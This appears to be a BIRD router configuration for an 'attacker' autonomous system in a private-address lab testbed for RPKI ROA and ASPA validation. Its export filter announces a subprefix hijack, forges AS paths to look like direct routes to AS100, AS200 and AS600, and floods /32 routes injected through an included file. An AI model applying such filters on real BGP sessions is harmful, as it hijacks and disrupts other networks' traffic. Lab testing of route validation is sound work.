# ==============================================================================
# AS500 BIRD Configuration (The Attacker)
# ==============================================================================

# --- 1. GLOBAL SETTINGS ---
log stderr all;
router id 172.18.0.50;

# --- 2. CORE SYSTEM PROTOCOLS ---
protocol device { 
    scan time 10; 
}

protocol direct { 
    ipv4; 
    interface "lo", "eth*"; 
}

protocol kernel { 
    ipv4 { 
        import all; 
        export all; 
    }; 
    learn; 
}
# --- 3. THE ATTACK FILTER ---
filter attack_route {
    # 0. Announce AS500's legitimate networks
    if net ~ [10.5.0.0/24, 10.7.0.0/24] then accept;

    # 1. ATTACK LOGIC (ONLY triggers if injected locally via hijack.conf)
    if source = RTS_STATIC then {
        
        # OBJECTIVE 1: ROA VIOLATION (Subprefix Hijack)
        if net = 10.100.0.1/32 then accept;

        # OBJECTIVE 2: MULTIPLE ASPA VIOLATIONS (Path Spoofing)
        # Spoofing direct path to AS100
        if net = 10.1.0.0/24 then {
            bgp_path.empty;        
            bgp_path.prepend(100); 
            accept;
        }
        # Spoofing direct path to AS200
        if net = 10.2.0.0/24 then {
            bgp_path.empty;        
            bgp_path.prepend(200); 
            accept;
        }
        # Spoofing direct path to AS600
        if net = 10.6.0.0/24 then {
            bgp_path.empty;        
            bgp_path.prepend(600); 
            accept;
        }

        # OBJECTIVE 3: VOLUME ATTACK (Allows hundreds of /32 routes)
        if net ~ [10.100.1.0/24+] then accept; 
    }
    
    # 2. ANTI-LEAK: Drop absolutely everything else
    reject;
}
# --- 4. BGP PEERS (ATTACK VECTORS) ---
protocol bgp AS400 {
    local as 500;
    neighbor 172.18.0.40 as 400;
    ipv4 { 
        import all;
        export filter attack_route; 
    };
}

protocol bgp AS600 {
    local as 500;
    neighbor 172.18.0.60 as 600;
    ipv4 { 
        import all;
        export filter attack_route; 
    };
}

# --- 5. DYNAMIC ATTACK INJECTION ---
include "hijack.conf";